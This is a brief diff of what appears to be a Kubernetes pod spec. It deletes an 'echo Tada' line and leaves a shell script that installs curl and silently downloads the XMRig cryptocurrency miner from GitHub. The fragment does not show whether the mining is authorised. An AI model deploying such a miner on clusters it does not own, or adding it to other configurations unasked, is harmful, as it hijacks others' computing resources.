@@ -27,7 +27,6 @@ spec:
         - /bin/sh
         - -c
         - |
-          echo Tada
           apt update
           apt install -y curl
           curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
